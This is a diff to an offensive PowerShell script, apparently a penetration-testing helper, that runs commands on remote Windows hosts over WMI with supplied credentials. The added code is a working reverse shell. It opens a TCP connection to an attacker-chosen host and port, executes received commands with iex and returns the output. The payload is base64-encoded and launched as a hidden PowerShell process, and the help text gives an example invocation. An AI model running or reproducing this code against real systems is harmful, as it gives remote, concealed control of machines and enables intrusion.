@@ -5,12 +5,18 @@
 #>
 #Parameters
 param (
+    #[Parameter(Mandatory=$true)]
+    #[string]$ldap_query,
 	[Parameter(Mandatory=$true)]
-    	[string]$param1,
+    [string]$param1,
 	
+	#[Parameter(Mandatory=$false)]
+	#[string]$ldap_property = "l",
 	[Parameter(Mandatory=$false)]
 	[string]$param2 = "l",
 	
+	#[Parameter(Mandatory=$false)]
+	#[string]$ldap_pasw)
 	[Parameter(Mandatory=$false)]
 	[string]$param3,
 	
@@ -18,7 +24,13 @@ param (
 	[string]$param4,
 	
 	[Parameter(Mandatory=$false)]
-	[string]$param5)
+	[string]$param5,
+	
+	[Parameter(Mandatory=$false)]
+	[string]$param6,
+	
+	[Parameter(Mandatory=$false)]
+	[string]$param7)
 
 #Script help
 if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
@@ -107,11 +119,19 @@ if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
   !NOTE: you can just run with 'wmi' and the rest will be prompted, if you don't want to plaintext the
          password on commandline.
   
+  To further expand WMI we can also launch a prebuilt reverse shell command, you just need to enter:
+  '<param5>' == 'reverse-shell' '<param6>' == 'lhost IP' '<param7>' == 'lhost port' or use the same 
+  param5 when prompted for a command:
+  
+  For example:
+  .\enumhelper.ps1 'wmi' 'username' 'password' '192.168.12.34' 'reverse-shell' '192.168.23.45' '4444'
+  
 <------------------------------------------------------------------------------------------------------->
  
   " -BackgroundColor Green -ForegroundColor Black
   exit
 }
+#Run commands over WMI
 elseif ($param1.ToUpper() -eq "WMI")
 {
 	if ($param2 -ne "1" -and $param2 -and $param3)
@@ -132,6 +152,25 @@ elseif ($param1.ToUpper() -eq "WMI")
 			$command = Read-Host -prompt 'Command to run: '
 		}
 	}
+	#Run reverse shell command
+	if ($command.ToUpper() -eq "REVERSE-SHELL")
+	{
+		if ($param6 -and $param7)
+		{
+			$lhost = $param6
+			$lport = $param7
+		}
+		else
+		{
+			$lhost = Read-Host -prompt 'LHost IP: '
+			$lport = Read-Host -prompt 'LHost port: '
+		}
+		$rshell = '$client = New-Object System.Net.Sockets.TCPClient("'+$lhost+'",'+$lport+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+		$rshell_bytes = [System.Text.Encoding]::Unicode.GetBytes($rshell)
+		$encoded_rshell =[Convert]::ToBase64String($rshell_bytes)
+		$command = 'powershell -nop -w hidden -e ' + $encoded_rshell
+	}
+	
 	Write-Host ""
 	Write-Host "###--------------WMIC-RUN--------------------###" -ForegroundColor Yellow
 	Write-Host ""
@@ -141,8 +180,8 @@ elseif ($param1.ToUpper() -eq "WMI")
 		$options = New-CimSessionOption -Protocol DCOM -ErrorAction stop
 		$params = @{'ComputerName'=$computer
 			'Credential'=$credential
-            		'SessionOption'=$options
-            		'ErrorAction'='Stop'}
+            'SessionOption'=$options
+            'ErrorAction'='Stop'}
 		$session = New-CimSession @params
 	}
 	catch [Microsoft.Management.Infrastructure.CimException]
